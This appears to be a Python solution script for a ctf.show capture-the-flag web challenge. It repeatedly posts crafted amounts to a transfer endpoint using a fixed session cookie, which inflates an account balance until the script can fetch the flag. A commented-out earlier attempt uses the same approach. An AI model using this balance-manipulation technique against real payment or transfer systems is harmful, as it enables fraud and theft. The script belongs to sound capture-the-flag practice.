# import re
#
# import requests
#
# headers = {
#     "Cookie": "PHPSESSID=h88im8lnetffv90ucg1kn8hhvr"
# }
# url1 = "http://585b491f-a653-483f-87a8-188d654da3bf.challenge.ctf.show/api/amount.php"
# url2 = "http://585b491f-a653-483f-87a8-188d654da3bf.challenge.ctf.show/transfer.php"
#
#
# money = '0'
# while int(money) <= 9999999:
#     res2 = requests.get(url2, headers=headers)
#     money = re.findall("你的余额：(.*?)元", res2.text)[0]
#     num = int(money) - 1
#     print(int(money))
#     data = {
#         'u': 'user',
#         'a': '{}'.format(num)
#     }
#     res1 = requests.post(url1, data=data, headers=headers)
#     print(res1.text)
# # print(res2.text)

import requests
x=5
url="http://585b491f-a653-483f-87a8-188d654da3bf.challenge.ctf.show/api/amount.php"
url2="http://585b491f-a653-483f-87a8-188d654da3bf.challenge.ctf.show/api/getFlag.php"
headers={    "Cookie": "PHPSESSID=h88im8lnetffv90ucg1kn8hhvr"}  #自己登录后的sessionid
while True:
	print(x)
	t=x-1
	data={
	'u':'testtest', #注册的用户名
	'a':str(t)
	}
	r=requests.post(url,headers=headers,data=data)
	print(r.text)
	if(x>10000):
		r2=requests.get(url2,headers=headers)
		print(r2.text)
		break
	x+=t